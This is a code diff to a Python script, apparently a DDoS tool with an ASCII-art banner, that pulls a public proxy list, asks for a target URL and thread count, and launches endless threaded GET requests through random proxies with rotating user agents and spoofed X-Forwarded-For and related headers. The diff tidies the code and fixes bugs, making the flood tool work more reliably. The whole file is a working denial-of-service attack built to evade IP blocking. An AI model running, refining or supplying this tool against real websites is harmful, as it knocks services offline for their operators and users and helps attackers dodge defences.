@@ -5,61 +5,58 @@ from random_user_agent.params import SoftwareName, OperatingSystem
 import threading
 from colorama import Fore, init
 
-‎def banner():
-‎ print(Fore.CYAN + r''''
-‎
-‎‎.##...##..##..##....######..##.......####...##..##...####..
-‎.###.###...####.....##......##......##..##..###.##..##.....
-‎.##.#.##....##......####....##......######..##.###..##.###.
-‎.##...##....##......##......##......##..##..##..##..##..##.
-‎.##...##....##......######..######..##..##..##..##...####..
-‎...........................................................
-‎''')
+init(autoreset=True)
+
+def banner():
+    print(Fore.CYAN + r'''
+ .##...##..##..##....######..##.......####...##..##...####..
+.###.###...####.....##......##......##..##..###.##..##.....
+.##.#.##....##......####....##......######..##.###..##.###.
+.##...##....##......##......##......##..##..##..##..##..##.
+.##...##....##......######..######..##..##..##..##...####..
+...........................................................
+''')
+
 sn = [SoftwareName.CHROME.value]
 os = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
-rotator = UserAgent(software_names=sn, operating_systems=os, limit=inf)
+rotator = UserAgent(software_names=sn, operating_systems=os, limit=10000)
 
 req = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
 r = requests.get(req)
 with open('proxy.txt', 'w') as f:
     f.write(r.text)
-    print('The proxies have been saved to proxy.txt in File')
+print('Proxies saved to proxy.txt')
 
 target = input("Target: ")
-threadcount = input("Threads: ")
-
+threadcount = int(input("Threads: "))
 proxyraw = [line.rstrip('\n') for line in open("proxy.txt")]
+
 def httpget():
     while True:
         try:
             proxy = random.choice(proxyraw)
-            proxies = {
-                "http": "http://"+proxy
-            }
+            proxies = {"http": "http://"+proxy}
             ua = rotator.get_random_user_agent()
-            randip = ".".join(map(str, (random.randint(0, 255) 
-                                    for _ in range(4))))
-            headers={
-            "X-Forwarded-For":randip,
-            "X-Originating-IP":randip,
-            "X-Remote-IP":randip,
-            "X-Remote-Addr":randip,
-            "User-Agent":ua,
-            "Accept-Language": "en-US,en;q=0.5",
-            "Connection": "Keep-Alive"
+            randip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+            headers = {
+                "X-Forwarded-For": randip,
+                "X-Originating-IP": randip,
+                "X-Remote-IP": randip,
+                "X-Remote-Addr": randip,
+                "User-Agent": ua,
+                "Accept-Language": "en-US,en;q=0.5",
+                "Connection": "Keep-Alive"
             }
-            requests.get(target, headers=headers, proxies=proxies)
+            requests.get(target, headers=headers, proxies=proxies, timeout=5)
             print(proxies)
         except Exception as e:
             print(e)
 
 def threader():
-    global threads
-    threads=[]
-    for i in range(int(threadcount)):
-        t=threading.Thread(target=httpget)
+    threads = []
+    for i in range(threadcount):
+        t = threading.Thread(target=httpget)
         threads.append(t)
         t.start()
 
 threader()
-
